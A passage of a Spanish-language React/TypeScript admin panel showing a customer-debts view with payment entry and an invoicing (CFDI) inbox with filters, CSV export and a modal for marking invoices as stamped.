      {grupos.length === 0 && apartados.length === 0 ? (
        <Card className="overflow-hidden">
          {cargando ? <FilasEsqueleto filas={4} columnas={3} /> : (
            <EstadoVacio
              titulo="Nadie debe nada"
              mensaje="Cuando una renta o un apartado quede con saldo, aparece aquí hasta liquidarse."
              icono={<><path d="M20 6 9 17l-5-5" /></>}
            />
          )}
        </Card>
      ) : (
        <div className="space-y-6">
         {grupos.length > 0 && (
          <div ref={ancla} className="space-y-3 scroll-mt-24">
          {gruposPag.map(g => {
            const abierto = abiertos.has(g.clave)
            const tipo = TIPO_ADEUDO[g.tipo]
            const inicial = (g.nombre.trim()[0] || '?').toUpperCase()
            return (
              <div key={g.clave} className="rounded-2xl border border-edge bg-surface overflow-hidden">
                {/* Cabecera de la PERSONA: su total de deuda de un vistazo. */}
                <button onClick={() => toggle(g.clave)}
                  className="w-full flex items-center gap-3.5 px-4 sm:px-5 py-4 text-left hover:bg-surface-2/40 transition-colors">
                  <span className="w-10 h-10 shrink-0 rounded-full bg-surface-2 grid place-items-center text-[15px] font-black text-ink">{inicial}</span>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[15px] font-extrabold text-ink truncate">{g.nombre}</span>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${tipo.cls}`}>{tipo.label}</span>
                    </div>
                    <p className="text-[12px] text-mute mt-0.5 truncate">
                      {g.rentas.length} {g.rentas.length === 1 ? 'renta' : 'rentas'} con saldo
                      {g.telefono ? ` · ${g.telefono}` : ''}
                    </p>
                  </div>
                  <div className="text-right shrink-0">
                    <p className="text-[10px] font-bold uppercase tracking-[0.08em] text-mute">Debe</p>
                    <p className="text-[19px] font-black text-red-600 dark:text-red-400 tabular-nums leading-tight">{money(g.total)}</p>
                  </div>
                  <svg className={`w-4 h-4 shrink-0 text-mute transition-transform ${abierto ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round"><path d="M6 9l6 6 6-6" /></svg>
                </button>

                {/* Desglose: cada renta suya, con su acción de abono. */}
                {abierto && (
                  <div className="border-t border-edge divide-y divide-edge">
                    {g.rentas.map(r => {
                      const chip = CHIP_RENTA_ADEUDO[r.estado || ''] || { label: (r.estado || '—').toUpperCase(), cls: 'bg-surface-2 text-mute' }
                      return (
                        <div key={r.id} className="flex flex-wrap items-center gap-x-4 gap-y-2 px-4 sm:px-5 py-3.5 bg-surface-2/30">
                          <div className="min-w-0 flex-1">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-[13.5px] font-bold text-ink truncate">{r.inventario.equipo || 'Equipo'}</span>
                              <span className={`text-[9.5px] font-bold px-1.5 py-0.5 rounded ${chip.cls}`}>{chip.label}</span>
                            </div>
                            <p className="text-[11.5px] font-mono text-mute mt-0.5 truncate">{r.inventario.codigo}</p>
                          </div>
                          <div className="text-right">
                            <p className="text-[10px] text-mute">Pagó {money(Number(r.pagado || 0))} de {money(Number(r.total || 0))}</p>
                            <p className="text-[15px] font-extrabold text-red-600 dark:text-red-400 tabular-nums leading-tight">{money(Number(r.saldo || 0))}</p>
                          </div>
                          <div className="flex gap-1.5 shrink-0">
                            <button onClick={() => setAbonando(r)}
                              className="h-8 px-3 rounded-lg bg-gold text-black text-[12px] font-bold hover:brightness-95 transition-all whitespace-nowrap">
                              + Abono
                            </button>
                            <button onClick={() => setVer(r)}
                              className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors">
                              Ver
                            </button>
                          </div>
                        </div>
                      )
                    })}
                    {/* Fusionar: por si el mismo cliente quedó tecleado de dos
                        formas ("Naomi" vs "Naomí"). Solo tiene sentido con otros
                        clientes a los cuales fundirlo. */}
                    {grupos.length > 1 && (
                      <button onClick={() => fusionar(g)}
                        className="w-full flex items-center gap-1.5 px-4 sm:px-5 py-2.5 text-[12px] font-semibold text-mute hover:text-ink hover:bg-surface-2 transition-colors">
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M7 8a4 4 0 1 0 0-.01M17 16a4 4 0 1 0 0-.01M7 8h6a4 4 0 0 1 4 4v4" /></svg>
                        ¿Es la misma persona que otro cliente? Fusionar
                      </button>
                    )}
                  </div>
                )}
              </div>
            )
          })}
          <Paginador {...pagProps} nombre="clientes con adeudo" />
          </div>
         )}
         {apartados.length > 0 && (
          <div className="space-y-3">
            <div className="flex items-center gap-2">
              <h3 className="text-[13px] font-black uppercase tracking-[0.08em] text-mute">Apartados y pedidos con saldo</h3>
              <span className="text-[11px] text-mute">· {money(totalApartados)}</span>
            </div>
            {apartados.map(p => {
              const abierto = apartadoAbierto.has(p.id)
              const quien = p.cuenta || p.empresa || p.nombre_cliente || 'Cliente'
              const inicial = (quien.trim()[0] || '?').toUpperCase()
              const badge = p.sobre_pedido
                ? { label: 'SOBRE PEDIDO', cls: 'bg-violet-500/12 text-violet-600 dark:text-violet-300' }
                : { label: 'APARTADO', cls: 'bg-sky-500/12 text-sky-600 dark:text-sky-300' }
              return (
                <div key={p.id} className="rounded-2xl border border-edge bg-surface overflow-hidden">
                  <div className="flex flex-wrap items-center gap-x-4 gap-y-2 px-4 sm:px-5 py-4">
                    <span className="w-10 h-10 shrink-0 rounded-full bg-surface-2 grid place-items-center text-[15px] font-black text-ink">{inicial}</span>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-[14.5px] font-extrabold text-ink truncate">{quien}</span>
                        <span className={`text-[9.5px] font-bold px-1.5 py-0.5 rounded ${badge.cls}`}>{badge.label}</span>
                      </div>
                      <p className="text-[12px] text-mute mt-0.5 truncate">
                        {p.equipo || 'Equipo'}{p.folio ? ` · ${p.folio}` : ''}{p.telefono_cliente ? ` · ${p.telefono_cliente}` : ''}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-[10px] text-mute">Pagó {money(Number(p.pagado || 0))} de {money(Number(p.total || 0))}</p>
                      <p className="text-[17px] font-black text-red-600 dark:text-red-400 tabular-nums leading-tight">{money(Number(p.saldo || 0))}</p>
                    </div>
                    <div className="flex gap-1.5 shrink-0">
                      <button onClick={() => setAbonandoApartado(p)}
                        className="h-8 px-3 rounded-lg bg-gold text-black text-[12px] font-bold hover:brightness-95 transition-all whitespace-nowrap">
                        + Abono
                      </button>
                      <button onClick={() => toggleApartado(p.id)}
                        className="h-8 px-3 rounded-lg border border-edge text-[12px] font-bold text-ink hover:bg-surface-2 transition-colors whitespace-nowrap">
                        {abierto ? 'Ocultar' : 'Ver abonos'}
                      </button>
                    </div>
                  </div>
                  {abierto && (
                    <div className="border-t border-edge px-4 sm:px-5 py-3 bg-surface-2/30">
                      {(p.pagos || []).length === 0 ? (
                        <p className="text-[12px] text-mute">Aún no hay abonos. El anticipo y cada pago quedan aquí con su fecha.</p>
                      ) : (
                        <ul className="space-y-1.5">
                          {(p.pagos || []).map((pago, i) => (
                            <li key={i} className="flex items-center justify-between gap-3 text-[12.5px]">
                              <span className="text-mute">{fechaAbono(pago.fecha)} · <span className="capitalize">{pago.metodo}</span>{pago.por ? ` · ${pago.por}` : ''}</span>
                              <span className="font-bold text-ink tabular-nums">{money(Number(pago.monto || 0))}</span>
                            </li>
                          ))}
                        </ul>
                      )}
                    </div>
                  )}
                </div>
              )
            })}
          </div>
         )}
        </div>
      )}

      {abonando && (
        <AbonoModal saldo={Number(abonando.saldo || 0)} onClose={() => setAbonando(null)} onRegistrar={registrarAbono} />
      )}
      {abonandoApartado && (
        <AbonoModal saldo={Number(abonandoApartado.saldo || 0)} onClose={() => setAbonandoApartado(null)} onRegistrar={registrarAbonoApartado} />
      )}
      {ver && (
        <RentaDetalleModal renta={ver} onClose={() => { setVer(null); reload() }} onOrdenCarta={() => abrirOrdenCartaPDF('rentas', ver.id)} notify={notify} onChanged={reload} />
      )}
    </div>
  )
}

/* ════════════════════════════════════════
   POR FACTURAR — bandeja de solicitudes de factura (CFDI)
════════════════════════════════════════ */
const FORMA_PAGO_LABEL: Record<string, string> = {
  '01': '01 · Efectivo', '02': '02 · Cheque', '03': '03 · Transferencia',
  '04': '04 · Tarjeta de crédito', '28': '28 · Tarjeta de débito', '99': '99 · Por definir',
}
const FACT_ESTADOS: { key: SolicitudFactura['estado']; label: string; cls: string; dot: string }[] = [
  { key: 'pendiente', label: 'Pendiente', cls: 'bg-amber-500/10 text-taller-ink', dot: '#B8872E' },
  { key: 'facturada', label: 'Facturada', cls: 'bg-emerald-500/10 text-emerald-600', dot: '#1F7A4D' },
  { key: 'cancelada', label: 'Cancelada', cls: 'bg-surface-2 text-mute', dot: '#6B7280' },
]
const factEstadoMeta = (e: string) => FACT_ESTADOS.find(x => x.key === e) || FACT_ESTADOS[0]

function FacturacionAdmin({ solicitudes, reload, notify, cargando }: {
  solicitudes: SolicitudFactura[]; reload: () => void; notify: Notify; cargando?: boolean
}) {
  const [q, setQ] = useState('')
  const [filtro, setFiltro] = useState<'todas' | SolicitudFactura['estado']>('pendiente')
  const [detalle, setDetalle] = useState<SolicitudFactura | null>(null)

  const pendientes = solicitudes.filter(s => s.estado === 'pendiente')
  const facturadas = solicitudes.filter(s => s.estado === 'facturada')
  const montoPend = pendientes.reduce((a, s) => a + (Number(s.total) || 0), 0)
  const montoFact = facturadas.reduce((a, s) => a + (Number(s.total) || 0), 0)

  const filtradas = solicitudes.filter(s => {
    if (filtro !== 'todas' && s.estado !== filtro) return false
    const t = q.trim().toLowerCase()
    if (!t) return true
    return `${s.folio_origen} ${s.razon_social} ${s.rfc} ${s.uuid} ${s.concepto}`.toLowerCase().includes(t)
  })

  // La bandeja se llena para siempre —cada venta y cada renta facturable deja
  // su solicitud—, así que la tabla se pagina. Los contadores de arriba siguen
  // contando sobre TODO, que es lo que se pregunta al abrir la sección.
  const { enPantalla, ancla, props: pagProps } = usePaginado(filtradas, undefined, [q, filtro])

  const fechaCorta = (v?: string | null) => (v ? new Date(v).toLocaleDateString('es-MX', { day: '2-digit', month: 'short' }) : '—')

  function exportar() {
    const params: any = {}
    if (filtro !== 'todas') params.estado = filtro
    if (q.trim()) params.q = q.trim()
    api.get('/facturacion/export/', { params, responseType: 'blob' })
      .then(res => {
        const url = URL.createObjectURL(res.data as Blob)
        const a = document.createElement('a'); a.href = url; a.download = 'por_facturar.csv'; a.click()
        URL.revokeObjectURL(url)
      })
      .catch(() => notify('No se pudo exportar', 'err'))
  }

  return (
    <div className="space-y-4">
      <KpiGrid
        items={[
          {
            label: 'Pendientes', value: pendientes.length, tone: 'gold', emphasis: pendientes.length > 0,
            helper: pendientes.length ? 'el cliente ya la pidió: falta timbrar' : 'nada esperando',
            icon: <><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z" /><path d="M14 3v5h5M9 13h6M9 17h4" /></>,
          },
          { label: 'Monto pendiente', value: <Monto valor={montoPend} />, tone: 'default', helper: 'suma de lo que falta timbrar', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
          { label: 'Facturadas', value: facturadas.length, tone: 'default', helper: 'ya timbradas y marcadas', icon: <><circle cx="12" cy="12" r="9" /><path d="m8.4 12 2.4 2.4 4.8-5" /></> },
          { label: 'Monto facturado', value: <Monto valor={montoFact} />, tone: 'default', helper: 'en el periodo visible', icon: <><path d="M12 1v22" /><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" /></> },
        ]}
      />

      <Card ref={ancla} className="overflow-hidden scroll-mt-24">
        <CardBarra titulo="Por facturar" cuenta={filtradas.length}>
          <div className="relative w-full sm:w-56">
            <svg className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-mute pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="9" cy="9" r="6" /><path d="M15 15l3 3" strokeLinecap="round" /></svg>
            <input aria-label="Buscar RFC, cliente, folio" value={q} onChange={e => setQ(e.target.value)} placeholder="Buscar RFC, cliente, folio…" className="campo campo-sm pl-10" />
          </div>
          <button onClick={exportar} className="shrink-0 inline-flex items-center gap-2 px-4 py-2 rounded-full border border-edge text-ink text-sm font-semibold hover:bg-surface-2 transition-colors">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path d="M12 3v12m0 0l-4-4m4 4l4-4M5 21h14" strokeLinecap="round" strokeLinejoin="round" /></svg>
            <span className="hidden sm:inline">Exportar CSV</span>
          </button>
        </CardBarra>

        <FiltroChips
          className="px-4 py-3 border-b border-edge"
          valor={filtro}
          onChange={(v: string) => setFiltro(v as any)}
          opciones={[
            { valor: 'todas', label: 'Todas', cuenta: solicitudes.length },
            ...FACT_ESTADOS.map(e => ({ valor: e.key as string, label: e.label, cuenta: solicitudes.filter(s => s.estado === e.key).length })),
          ]}
        />

        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[820px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Origen</th>
                <th className="font-semibold px-3 py-3">Cliente / RFC</th>
                <th className="font-semibold px-3 py-3 text-right">Total</th>
                <th className="font-semibold px-3 py-3">Fecha</th>
                <th className="font-semibold px-3 py-3">Estado</th>
                <th className="font-semibold px-5 py-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {enPantalla.map(s => {
  const m = factEstadoMeta(s.estado)
                return (
                  <tr key={s.id} className="hover:bg-surface-2 transition-colors cursor-pointer" onClick={() => setDetalle(s)}>
                    <td className="px-5 py-3">
                      <div className="flex items-center gap-2">
                        <span className="font-mono text-[13px] font-bold text-ink">{s.folio_origen}</span>
                        <span className="text-[10px] font-bold px-1.5 py-0.5 rounded bg-surface-2 text-mute uppercase">{s.tipo}</span>
                      </div>
                      <p className="text-[11px] text-mute truncate max-w-[200px]">{s.concepto}</p>
                    </td>
                    <td data-col="Cliente" className="px-3 py-3">
                      <div>
                        <p className="text-sm font-semibold text-ink truncate max-w-[200px]">{s.cliente_display}</p>
                        <p className="text-[11px] text-mute font-mono">{s.rfc || '—'}</p>
                      </div>
                    </td>
                    <td data-col="Total" className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap"><span>{orMoney(s.total)}</span></td>
                    <td data-col="Fecha" className="px-3 py-3 text-[13px] text-mute whitespace-nowrap"><span>{fechaCorta(s.fecha_origen)}</span></td>
                    <td data-col="Estado" className="px-3 py-3">
                      <div>
                        <span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{m.label}</span>
                        {s.estado === 'pendiente' && !s.datos_completos && <p className="text-[10px] text-red-500 mt-1">Datos incompletos</p>}
                      </div>
                    </td>
                    <td className="px-5 py-3 text-right" onClick={e => e.stopPropagation()}>
                      <button onClick={() => setDetalle(s)} className="h-8 px-3 rounded-lg border border-edge text-mute text-xs font-semibold hover:text-ink hover:border-gold/40 transition-colors">
                        {s.estado === 'pendiente' ? 'Facturar' : 'Ver'}
                      </button>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
          {filtradas.length === 0 && (cargando ? <FilasEsqueleto filas={5} columnas={4} /> : (
            <EstadoVacio
              titulo={q || filtro !== 'todas' ? 'Sin solicitudes con ese criterio' : 'Nada por facturar'}
              mensaje={q || filtro !== 'todas'
                ? 'Cambia el filtro de arriba o borra la búsqueda.'
                : 'Cuando un cliente pida factura de una venta o una renta, la solicitud aparece aquí para que la timbres.'}
              icono={<><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z" /><path d="M14 3v5h5M9 13h6M9 17h4" /></>}
            />
          ))}
        </div>
        <Paginador {...pagProps} nombre="solicitudes" />
      </Card>

      {detalle && <SolicitudFacturaModal solicitud={detalle} notify={notify} onClose={() => setDetalle(null)} onChanged={reload} />}
    </div>
  )
}

function SolicitudFacturaModal({ solicitud, notify, onClose, onChanged }: {
  solicitud: SolicitudFactura; notify: Notify; onClose: () => void; onChanged: () => void
}) {
  const [s, setS] = useState<SolicitudFactura>(solicitud)
  const [uuid, setUuid] = useState(solicitud.uuid || '')
  const [busy, setBusy] = useState(false)
  const set = (k: keyof SolicitudFactura, v: string) => setS(prev => ({ ...prev, [k]: v }))
  const facturada = s.estado === 'facturada'

  function guardarDatos() {
    setBusy(true)
    api.patch<SolicitudFactura>(`/facturacion/solicitudes/${s.id}/`, {
      rfc: s.rfc, razon_social: s.razon_social, codigo_postal: s.codigo_postal,
      regimen_fiscal: s.regimen_fiscal, uso_cfdi: s.uso_cfdi, email: s.email, forma_pago: s.forma_pago, notas: s.notas,
    })
      .then(r => { setS(r.data); notify('Datos actualizados'); onChanged() })
      .catch(err => notify(err?.response?.data?.detalle || 'No se pudo guardar', 'err'))
      .finally(() => setBusy(false))
  }
  function marcarFacturada() {
    if (!uuid.trim()) { notify('Captura el folio fiscal (UUID)', 'err'); return }
    setBusy(true)
    api.post<SolicitudFactura>(`/facturacion/solicitudes/${s.id}/facturada/`, { uuid: uuid.trim(), notas: s.notas })
      .then(r => { setS(r.data); notify('Marcada como facturada · el cliente ya fue avisado', 'ok'); onChanged() })
      .catch(err => notify(err?.response?.data?.detalle || 'Error', 'err'))
      .finally(() => setBusy(false))
  }
  function reabrir() {
    setBusy(true)
    api.post<SolicitudFactura>(`/facturacion/solicitudes/${s.id}/reabrir/`, {})
      .then(r => { setS(r.data); setUuid(''); notify('Regresada a pendiente', 'neutro'); onChanged() })
      .catch(err => notify(err?.response?.data?.detalle || 'Error', 'err'))
      .finally(() => setBusy(false))
  }

  const copiarDatos = () => {
    const txt = [
      `RFC: ${s.rfc}`, `Razón social: ${s.razon_social}`, `CP: ${s.codigo_postal}`,
      `Régimen: ${s.regimen_fiscal}`, `Uso CFDI: ${s.uso_cfdi}`, `Email: ${s.email}`,
      `Subtotal: ${s.subtotal}`, `IVA: ${s.iva}`, `Total: ${s.total}`,
      `Forma de pago: ${s.forma_pago}`, `Concepto: ${s.concepto}`,
    ].join('\n')
    navigator.clipboard?.writeText(txt).then(() => notify('Datos copiados', 'ok'), () => {})
  }

  const m = factEstadoMeta(s.estado)
  return (
    <Modal className="modal-in fixed inset-0 z-[80] bg-black/60 backdrop-blur-sm flex items-start justify-center p-4 sm:p-6 overflow-y-auto" onClose={onClose} label="Detalle de facturación">
      <div onClick={e => e.stopPropagation()} className="w-full sm:max-w-[820px] bg-surface border border-edge rounded-2xl overflow-hidden sm:my-auto max-h-[92vh] flex flex-col shadow-[0_20px_50px_rgba(33,29,22,0.18)]">
        <div className="px-6 py-4 border-b border-edge flex items-center justify-between shrink-0">
          <div>
            <div className="flex items-center gap-2">
              <span className="font-mono font-bold text-ink">{s.folio_origen}</span>
              <span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{m.label}</span>
            </div>
            <p className="text-[12px] text-mute mt-0.5">{s.concepto}</p>
          </div>
          <button onClick={onClose} className="text-mute hover:text-ink p-1 shrink-0"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg></button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 space-y-4">
          {/* Importes */}
          <div className="grid grid-cols-3 gap-2 text-center">
            <div className="rounded-lg bg-surface-2 py-2"><p className="text-[10px] uppercase text-mute">Subtotal</p><p className="text-sm font-bold text-ink">{orMoney(s.subtotal)}</p></div>
            <div className="rounded-lg bg-surface-2 py-2"><p className="text-[10px] uppercase text-mute">IVA 16%</p><p className="text-sm font-bold text-ink">{orMoney(s.iva)}</p></div>
            <div className="rounded-lg bg-gold-soft py-2"><p className="text-[10px] uppercase text-mute">Total</p><p className="text-sm font-extrabold text-price">{orMoney(s.total)}</p></div>
          </div>

          {/* Receptor */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <p className="text-[11px] font-bold uppercase tracking-wide text-gold-ink">Datos del receptor</p>
              <button onClick={copiarDatos} className="text-[11px] text-gold-ink hover:underline">Copiar datos</button>
            </div>
            <div className="grid grid-cols-2 gap-2">
              <input aria-label="RFC" className={`${input} font-mono`} value={s.rfc} onChange={e => set('rfc', e.target.value.toUpperCase())} placeholder="RFC" disabled={facturada} />
              <input aria-label="C.P." className={input} value={s.codigo_postal} onChange={e => set('codigo_postal', e.target.value)} placeholder="C.P." disabled={facturada} />
              <input aria-label="Razón social" className={`${input} col-span-2`} value={s.razon_social} onChange={e => set('razon_social', e.target.value)} placeholder="Razón social" disabled={facturada} />
              <select aria-label="Régimen fiscal" className={input} value={s.regimen_fiscal} onChange={e => set('regimen_fiscal', e.target.value)} disabled={facturada}>
                <option value="">Régimen fiscal</option>
                {REGIMEN_FISCAL.map(o => <option key={o.code} value={o.code} className="bg-surface">{o.label}</option>)}
              </select>
              <select aria-label="Uso del CFDI" className={input} value={s.uso_cfdi} onChange={e => set('uso_cfdi', e.target.value)} disabled={facturada}>
                <option value="">Uso CFDI</option>
                {USO_CFDI.map(o => <option key={o.code} value={o.code} className="bg-surface">{o.label}</option>)}
              </select>
              <input aria-label="Email" type="email" className={`${input} col-span-2`} value={s.email} onChange={e => set('email', e.target.value)} placeholder="Email" disabled={facturada} />
              <select aria-label="Forma de pago" className={`${input} col-span-2`} value={s.forma_pago} onChange={e => set('forma_pago', e.target.value)} disabled={facturada}>
                <option value="">Forma de pago (SAT)</option>
                {Object.entries(FORMA_PAGO_LABEL).map(([code, lbl]) => <option key={code} value={code} className="bg-surface">{lbl}</option>)}
              </select>
            </div>
            {!facturada && <button onClick={guardarDatos} disabled={busy} className="mt-2 w-full py-2 rounded-lg border border-edge text-ink text-xs font-semibold hover:bg-surface-2 transition-colors disabled:opacity-50">Guardar datos</button>}
          </div>

          {/* Timbrado */}
          {facturada ? (
            <div className="rounded-xl bg-emerald-500/10 border border-emerald-500/20 px-4 py-3">
              <p className="text-[11px] uppercase text-mute">Folio fiscal (UUID)</p>
              <p className="text-sm font-mono font-bold text-ink break-all">{s.uuid}</p>
              {s.fecha_timbrado && <p className="text-[11px] text-mute mt-1">Timbrada el {new Date(s.fecha_timbrado).toLocaleString('es-MX')}</p>}
            </div>
          ) : (
            <div>
              <label className={label}>Folio fiscal (UUID) — al timbrar en tu PAC</label>
              <input aria-label="Folio fiscal (UUID)" className={`${input} font-mono`} value={uuid} onChange={e => setUuid(e.target.value)} placeholder="Ej. 3F2504E0-4F89-11D3-9A0C-0305E82C3301" />
              <p className="text-[11px] text-mute mt-1.5">Al marcarla, al cliente le llega el aviso de que su compra ya está facturada.</p>
            </div>
          )}

        </div>

        <div className="px-6 py-4 border-t border-edge flex gap-3 shrink-0">
          <button onClick={onClose} className="flex-1 py-2.5 rounded-full border border-edge text-ink text-sm font-semibold hover:bg-surface-2 transition-colors">Cerrar</button>
          {facturada
            ? <button onClick={reabrir} disabled={busy} className="flex-1 py-2.5 rounded-full border border-amber-500/40 text-taller-ink text-sm font-semibold hover:bg-amber-500/10 transition-colors disabled:opacity-50">Reabrir</button>
            : <button onClick={marcarFacturada} disabled={busy} className="flex-1 py-2.5 rounded-full bg-gold text-black text-sm font-bold hover:opacity-90 transition-opacity disabled:opacity-50">Marcar facturada</button>}
        </div>
      </div>
    </Modal>
  )
}
